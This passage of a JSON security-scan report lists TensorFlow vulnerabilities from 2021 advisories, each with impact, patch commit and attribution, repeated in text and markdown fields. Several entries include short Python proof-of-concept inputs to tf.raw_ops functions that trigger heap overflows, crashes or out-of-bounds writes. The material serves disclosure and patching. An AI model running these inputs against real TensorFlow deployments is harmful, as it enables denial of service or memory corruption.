[63c6a29d0f2d692b247f7bf81f8732d6442fad09](https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29576**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29576)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` is vulnerable to a heap buffer overflow: \n\n```python\nimport tensorflow as tf\n\nvalues = [0.01] * 11\norig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L694-L696) does not check that the initialization of `Pool3dParameters` completes successfully:\n\n```cc\nPool3dParameters params{context,  ksize_,       stride_,\n                        padding_, data_format_, tensor_in.shape()};\n```\n\nSince [the constructor](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L48-L88) uses `OP_REQUIRES` to validate conditions, the first assertion that fails interrupts the initialization of `params`, making it contain invalid data. In turn, this might cause a heap buffer overflow, depending on default initialized values.\n\n### Patches\nWe have patched the issue in GitHub commit [63c6a29d0f2d692b247f7bf81f8732d6442fad09](https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29561",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29561"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29561",
              "help": {
                "text": "Vulnerability CVE-2021-29561\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29561)\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:\n    \n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.\n  \n```cc\nconst string\u0026 ckpt_path = ckpt_path_t-\u003escalar\u003ctstring\u003e()();\n```\n\nHowever, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar\u003cT\u003e()()` to trigger and terminate the process.\n\n### Patches\nWe have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29561**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29561)|\n\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:\n    \n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.\n  \n```cc\nconst string\u0026 ckpt_path = ckpt_path_t-\u003escalar\u003ctstring\u003e()();\n```\n\nHowever, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar\u003cT\u003e()()` to trigger and terminate the process.\n\n### Patches\nWe have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29604",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29604"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29604",
              "help": {
                "text": "Vulnerability CVE-2021-29604\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29604](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29604)\n### Impact\nThe TFLite implementation of hashtable lookup is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/hashtable_lookup.cc#L114-L115):\n\n```cc\nconst int num_rows = SizeOfDimension(value, 0); \nconst int row_bytes = value-\u003ebytes / num_rows; \n```\n\nAn attacker can craft a model such that `values``s first dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [5117e0851348065ed59c991562c0ec80d9193db2](https://github.com/tensorflow/tensorflow/commit/5117e0851348065ed59c991562c0ec80d9193db2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29604**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29604](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29604)|\n\n### Impact\nThe TFLite implementation of hashtable lookup is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/hashtable_lookup.cc#L114-L115):\n\n```cc\nconst int num_rows = SizeOfDimension(value, 0); \nconst int row_bytes = value-\u003ebytes / num_rows; \n```\n\nAn attacker can craft a model such that `values``s first dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [5117e0851348065ed59c991562c0ec80d9193db2](https://github.com/tensorflow/tensorflow/commit/5117e0851348065ed59c991562c0ec80d9193db2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29579",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29579"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29579",
              "help": {
                "text": "Vulnerability CVE-2021-29579\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29579)\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1] \nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n  strides=strides, padding=padding, explicit_paddings=[])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ab1e644b48c82cb71493f4362b4dd38f4577a1cf/tensorflow/core/kernels/maxpooling_op.cc#L194-L203) fails to validate that indices used to access elements of input/output arrays are valid:\n\n```cc\nfor (int index = out_start; index \u003c out_end; ++index) {\n  int input_backprop_index = out_arg_max_flat(index);\n  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);\n  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);\n}\n```\n\nWhereas accesses to `input_backprop_flat` are guarded by `FastBoundsCheck`, the indexing in `out_backprop_flat` can result in OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [a74768f8e4efbda4def9f16ee7e13cf3922ac5f7](https://github.com/tensorflow/tensorflow/commit/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29579**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29579)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1] \nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n  strides=strides, padding=padding, explicit_paddings=[])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ab1e644b48c82cb71493f4362b4dd38f4577a1cf/tensorflow/core/kernels/maxpooling_op.cc#L194-L203) fails to validate that indices used to access elements of input/output arrays are valid:\n\n```cc\nfor (int index = out_start; index \u003c out_end; ++index) {\n  int input_backprop_index = out_arg_max_flat(index);\n  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);\n  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);\n}\n```\n\nWhereas accesses to `input_backprop_flat` are guarded by `FastBoundsCheck`, the indexing in `out_backprop_flat` can result in OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [a74768f8e4efbda4def9f16ee7e13cf3922ac5f7](https://github.com/tensorflow/tensorflow/commit/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29601",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29601"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29601",
              "help": {
                "text": "Vulnerability CVE-2021-29601\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29601)\n### Impact\nThe TFLite implementation of concatenation is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/7b7352a724b690b11bfaae2cd54bc3907daf6285/tensorflow/lite/kernels/concatenation.cc#L70-L76):\n\n```cc\nfor (int d = 0; d \u003c t0-\u003edims-\u003esize; ++d) {\n  if (d == axis) { \n    sum_axis += t-\u003edims-\u003edata[axis]; \n  } else {\n    TF_LITE_ENSURE_EQ(context, t-\u003edims-\u003edata[d], t0-\u003edims-\u003edata[d]);\n  }\n}\n```\n\nAn attacker can craft a model such that the dimensions of one of the concatenation input overflow the values of `int`. TFLite uses `int` to represent tensor dimensions, whereas TF uses `int64`. Hence, valid TF models can trigger an integer overflow when converted to TFLite format.\n\n### Patches\nWe have patched the issue in GitHub commit [4253f96a58486ffe84b61c0415bb234a4632ee73](https://github.com/tensorflow/tensorflow/commit/4253f96a58486ffe84b61c0415bb234a4632ee73).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29601**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29601)|\n\n### Impact\nThe TFLite implementation of concatenation is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/7b7352a724b690b11bfaae2cd54bc3907daf6285/tensorflow/lite/kernels/concatenation.cc#L70-L76):\n\n```cc\nfor (int d = 0; d \u003c t0-\u003edims-\u003esize; ++d) {\n  if (d == axis) { \n    sum_axis += t-\u003edims-\u003edata[axis]; \n  } else {\n    TF_LITE_ENSURE_EQ(context, t-\u003edims-\u003edata[d], t0-\u003edims-\u003edata[d]);\n  }\n}\n```\n\nAn attacker can craft a model such that the dimensions of one of the concatenation input overflow the values of `int`. TFLite uses `int` to represent tensor dimensions, whereas TF uses `int64`. Hence, valid TF models can trigger an integer overflow when converted to TFLite format.\n\n### Patches\nWe have patched the issue in GitHub commit [4253f96a58486ffe84b61c0415bb234a4632ee73](https://github.com/tensorflow/tensorflow/commit/4253f96a58486ffe84b61c0415bb234a4632ee73).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "6.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29593",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29593"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29593",
              "help": {
                "text": "Vulnerability CVE-2021-29593\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29593](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29593)\n### Impact\nThe implementation of the `BatchToSpaceNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/b5ed552fe55895aee8bd8b191f744a069957d18d/tensorflow/lite/kernels/batch_to_space_nd.cc#L81-L82):\n\n```cc\nTF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);\noutput_batch_size = output_batch_size / block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [2c74674348a4708ced58ad6eb1b23354df8ee044](https://github.com/tensorflow/tensorflow/commit/2c74674348a4708ced58ad6eb1b23354df8ee044).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29593**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29593](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29593)|\n\n### Impact\nThe implementation of the `BatchToSpaceNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/b5ed552fe55895aee8bd8b191f744a069957d18d/tensorflow/lite/kernels/batch_to_space_nd.cc#L81-L82):\n\n```cc\nTF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);\noutput_batch_size = output_batch_size / block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [2c74674348a4708ced58ad6eb1b23354df8ee044](https://github.com/tensorflow/tensorflow/commit/2c74674348a4708ced58ad6eb1b23354df8ee044).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29607",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29607"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29607",
              "help": {
                "text": "Vulnerability CVE-2021-29607\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29607](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29607)\n### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python \nimport tensorflow as tf\n\na_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    b_shape=b_shape)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_sparse_binary_op_shared.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches \nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [f6fde895ef9c77d848061c0517f19d0ec2682f3a](https://github.com/tensorflow/tensorflow/commit/f6fde895ef9c77d848061c0517f19d0ec2682f3a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29607**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29607](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29607)|\n\n### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python \nimport tensorflow as tf\n\na_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    b_shape=b_shape)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_sparse_binary_op_shared.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches \nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https://github.com/tensorflow/tensorflow/commit/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [f6fde895ef9c77d848061c0517f19d0ec2682f3a](https://github.com/tensorflow/tensorflow/commit/f6fde895ef9c77d848061c0517f19d0ec2682f3a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29595",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29595"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29595",
              "help": {
                "text": "Vulnerability CVE-2021-29595\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29595)\n### Impact\nThe implementation of the `DepthToSpace` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/depth_to_space.cc#L63-L69):\n\n```cc\nconst int block_size = params-\u003eblock_size;\n...\nconst int input_channels = input-\u003edims-\u003edata[3];\n... \nint output_channels = input_channels / block_size / block_size;\n``` \n\nAn attacker can craft a model such that `params-\u003eblock_size` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [106d8f4fb89335a2c52d7c895b7a7485465ca8d9](https://github.com/tensorflow/tensorflow/commit/106d8f4fb89335a2c52d7c895b7a7485465ca8d9).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29595**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29595)|\n\n### Impact\nThe implementation of the `DepthToSpace` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/depth_to_space.cc#L63-L69):\n\n```cc\nconst int block_size = params-\u003eblock_size;\n...\nconst int input_channels = input-\u003edims-\u003edata[3];\n... \nint output_channels = input_channels / block_size / block_size;\n``` \n\nAn attacker can craft a model such that `params-\u003eblock_size` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [106d8f4fb89335a2c52d7c895b7a7485465ca8d9](https://github.com/tensorflow/tensorflow/commit/106d8f4fb89335a2c52d7c895b7a7485465ca8d9).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29574",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29574"
              },
              "defaultConfiguration": {
                "level": "note"
              },
